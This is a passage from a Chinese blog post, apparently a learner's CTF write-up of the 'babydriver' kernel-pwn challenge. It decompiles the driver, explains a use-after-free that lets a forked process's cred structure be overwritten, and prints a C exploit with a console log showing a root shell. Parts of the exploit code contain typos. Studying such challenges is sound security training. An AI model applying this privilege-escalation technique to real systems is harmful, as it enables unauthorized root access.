&quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了可装载模块babydriver.ko，阅读其他wp的时候发现他们还会用checksec查看.ko文件的保护，这块我不能理解，按照逻辑来说，它装载到了内核，应该和内核共享一套保护措施了，为啥还要检查他用户态的保护措施（？），除了看到了.ko文件，还发现他对flag文件进行了权限限制<code>chown root:root flagchmod 400 flag</code></p>
<p>Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）,文件所有者就是创建这个文件的人。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 数字权限是基于二进制数字系统而创建的，读（read，r）的值是4，写（write，w）的值是2，执行（execute，x）的值是1，没有授权的值是0。这种模式下，权限组合变成简单的加分运算。于是，在ls -l命令表示的数字权限对应关系是：</span><br><span class="line">0 ---</span><br><span class="line">1 --x</span><br><span class="line">2 -w-</span><br><span class="line">3 -wx</span><br><span class="line">4 r--</span><br><span class="line">5 r-x</span><br><span class="line">6 rw-</span><br><span class="line">7 rwx</span><br><span class="line">虽然可以设置各式各样的权限，但常用的权限只有几种。它们的含义是：</span><br><span class="line">400   -r--------   拥有者能够读，其他任何人不能进行任何操作；</span><br><span class="line">644   -rw-r--r--   拥有者都能够读，但只有拥有者可以编辑；</span><br><span class="line">660   -rw-rw----   拥有者和组用户都可读和写，其他人不能进行任何操作；</span><br><span class="line">664   -rw-rw-r--   所有人都可读，但只有拥有者和组用户可编辑；</span><br><span class="line">700   -rwx------   拥有者能够读、写和执行，其他用户不能任何操作；</span><br><span class="line">744   -rwxr--r--   所有人都能读，但只有拥有者才能编辑和执行；</span><br><span class="line">755   -rwxr-xr-x   所有人都能读和执行，但只有拥有者才能编辑；</span><br><span class="line">777   -rwxrwxrwx   所有人都能读、写和执行（该设置通常不是好想法）。</span><br></pre></td></tr></table></figure>

<p>综上所述，第一条指令就是把flag文件的文件所有者改成了root用户，然后第二条指令的作用是只有文件所有者才能读flag文件，即root用户才能读这个文件。</p>
<p>所以要读这个flag文件就得通过.ko文件进行提权。</p>
<p>通过ida对.ko文件进行静态分析</p>
<p>shitf+f9发现很多结构体，通过别人的wp对这些结构体有了初步的认识，其中’file_operations’结构体算是解决了我的一个困惑，我之前不明白为什么在程序中调用ioctl就能调用设备的babyioctl函数了，原来程序在init的时候会进行类似重定向的操作，这个.ko就在<code>cdev_init(&amp;cdev_0, &amp;fops)</code>中进行，最后的重定向表是这个样子的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过对比可以知道对设备文件的操作会通过如下函数进行处理（注意这里IDA显示的有些问题，release其实对应的是babyrelease）：</span><br><span class="line">* open: babyopen</span><br><span class="line">* read: babyread</span><br><span class="line">* write: babywrite</span><br><span class="line">* ioctl: babyioctl</span><br><span class="line">* release: babyrelease</span><br></pre></td></tr></table></figure>

<p>这个是别人的wp搬用的，我现在只知道会有重定向的操作，但无法具体分析出重定向表。</p>
<p>第二个需要注意的是babydevice_t结构体，这个结构体在之后的漏洞利用中起关键作用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br></pre></td></tr></table></figure>

<p>下面对文件的每个函数具体分析</p>
<p><strong>babyopen</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">37748928LL</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数对应open函数，在每次通过open函数打开设备的时候就会调用这个函数，函数的主要逻辑就是用kmalloc申请一个64字节的堆，然后把堆地址储存在babaydevice_t.buf上，然后把长度储存在babydevice_t.buf_len上面</p>
<p><strong>babyread</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应read函数，函数的逻辑是查看babydevice是否有值，如果有的话那长度和传进来的v4进行比较，如果大于的话就把babydevice_t.buf的值拷贝到buffer，这个buffer就是我们传递的参数。</p>
<p><strong>babywrite</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user(babydev_struct.device_buf, (<span class="keyword">void</span> *)buffer, (<span class="keyword">void</span> *)v4);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对应write函数，奇怪我的ida反编译出的代码和别人的不一样，函数的逻辑就是检查要拷贝的长度是否小于babydevice_t.len_buf，如果小于的话就把buffer的值传递给babydevice_t.buf</p>
<p><strong>babyioctl</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">37748928LL</span>, v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应ioctl函数，如果传进来的参数command等于0x10001,那就kfree掉babydevice.buf，然后再申请一个堆，堆的大小是传进来的参数，也就是说我们能够控制，再把堆的大小赋值给babydevice.buf_len</p>
<p><strong>babyrelease</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应close函数，逻辑就是kfree掉babydevice.buf</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>babydevice_t是全局变量，所有打开这个设备的进程都会共享这个变量，至于原因我刚开始以为是多线程共享变量之类的，之后在查阅资料中说是<strong>所有进程内核态的变量都指向同一片物理内存</strong>，有点道理，但不知道说的对不对就是了。</p>
<p>漏洞出在了bayrelease函数上，当kfree掉一个堆后没有清理指针，如果两次打开设备，把第一个设备babyrelease掉，此时第二个设备的babydevice_t.buf就储存着刚才free掉的堆的地址，构成了ufa.</p>
<p>浏览别人的wp发现是这样利用这个ufa的，由于这个内核版本过低，所以管理进程权限的cred结构体的申请和一般堆的申请相同，而且这个版本的cred结构体的大小是0xa8,那就可以打开两次设备，然后用第一个设备再ioctl一个0xa8的堆块，然后再babyrelease,这个第二个堆块的babydevice_t.buf就记录着0xa8的free的堆的地址，然后我们再fork()一个子进程，申请到储存这个子进程的cred的堆就是我们刚才free掉的堆，我们就可以利用第二个设备对这个子进程的cred进行改写了。</p>
<p>exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1=open(<span class="string">&#x27;/dev/babydev&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2=open(<span class="string">&#x27;/dev/babydev&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">    inctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;fork fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,zeros,<span class="number">28</span>);</span><br><span class="line">        <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于是第一次写kerenlpwn的脚本，所以几乎全部都参考了别人的代码，这份代码中有几处我之前没听说过的地方，下面记录一下</p>
<p><strong>fork函数</strong></p>
<p>这是一个父进程产生一个子进程的函数，当一个父进程调用fork()函数的时候实际上最后fork函数被调用了两次，在父函数中调用fork函数时会创建一个子进程并返回子进程的id,在子进程中也会有fork函数，他也会调用，不过这时候就不会返回一个新的子进程不然就死循环了，他会返回0，所以上面的代码中执行system(“/bin/sh”)的实际上是子进程，不是父进程。</p>
<p><strong>getuid</strong></p>
<p>获得cred结构体中uid的值，这个值决定着这个进程的权限，当uid为0的时候代表这个进程是root权限。</p>
<p><strong>权限修改</strong></p>
<p>cred结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>当把cred的uid~fsgid全部覆盖为0的话对应进程就提升为root</p>
<p><strong>提权过程</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译exp</span></span><br><span class="line">gcc exp.c -static -o exp</span><br><span class="line"><span class="meta">#</span><span class="bash">打包文件系统</span></span><br><span class="line"> find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"><span class="meta">#</span><span class="bash">加载内核</span></span><br><span class="line">./boot.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">执行exp</span></span><br><span class="line">exp    exp.c</span><br><span class="line">~ $ ./exp</span><br><span class="line">[   13.823599] device open</span><br><span class="line">[   13.825222] device open</span><br><span class="line">[   13.826817] alloc done</span><br><span class="line">[   13.828409] device release</span><br><span class="line">ok</span><br><span class="line">/home/ctf # id</span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br></pre></td></tr></table></figure>

<p>可见已经提权至root.</p>
<h2 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">解压bzTmage得到vmlinux</span></span><br><span class="line"><span class="meta">/usr/src/linux-headers-$</span><span class="bash">(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span></span><br><span class="line"><span class="meta">#</span><span class="bash">vmlinux是没有压缩的内核镜像，里面可能含有符号表，也可以用来搜索gadget,这道题暂时用不到vmlinux</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">在boot.sh中添加-gdb tcp::1234 我的虚拟机不能在后面加-S,不然抓不到程序，搜了一下好像是gdb和gdbserver版本不匹配的问题。</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">先运行启动脚本，再使用gdb ./vmlinux启动gdb,并连接到qemu</span></span><br><span class="line">target remote localhost:1234</span><br><span class="line"><span class="meta">#</span><span class="bash">加入ko文件的符号表，类似这样的命令add-symbol-file core.ko textaddr</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> add-symbol-file babydriver.ko 0xffffffffc0000000</span></span><br><span class="line">add symbol table from file &quot;babydriver.ko&quot; at</span><br><span class="line">    .text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from babydriver.ko...done.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">然后就可以调试了</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b babyopen</span></span><br><span class="line">► 0xffffffffc0000030 &lt;babyopen&gt;       nop    dword ptr [rax + rax]</span><br><span class="line">   0xffffffffc0000035 &lt;babyopen+5&gt;     push   rbp</span><br><span class="line">   0xffffffffc0000036 &lt;babyopen+6&gt;     mov    rdi, qword ptr [rip - 0x3de3bc0d]</span><br><span class="line">   0xffffffffc000003d &lt;babyopen+13&gt;    mov    edx, init_module+28           &lt;64&gt;</span><br><span class="line">   0xffffffffc0000042 &lt;babyopen+18&gt;    mov    esi, 0x24000c0</span><br><span class="line">   0xffffffffc0000047 &lt;babyopen+23&gt;    mov    rbp, rsp</span><br><span class="line">   0xffffffffc000004a &lt;babyopen+26&gt;    call   0xffffffff811ea180            &lt;0xffffffff811ea180&gt;</span><br><span class="line"> </span><br><span class="line">   0xffffffffc000004f &lt;babyopen+31&gt;    mov    rdi, -0x3fffefcc</span><br><span class="line">   0xffffffffc0000056 &lt;babyopen+38&gt;    mov    qword ptr [rip + 0x2473], rax</span><br><span class="line">   0xffffffffc000005d &lt;babyopen+45&gt;    mov    qword ptr [rip + 0x2470], init_module+28 &lt;64&gt;</span><br><span class="line">   0xffffffffc0000068 &lt;babyopen+56&gt;    call   0xffffffff8118b077            </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了很多东西，解决了kernelpwn的第一道题（也是最简单的一道）。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/10/%E5%86%85%E6%A0%B8pwn%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%88%9D%E8%AE%A4%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
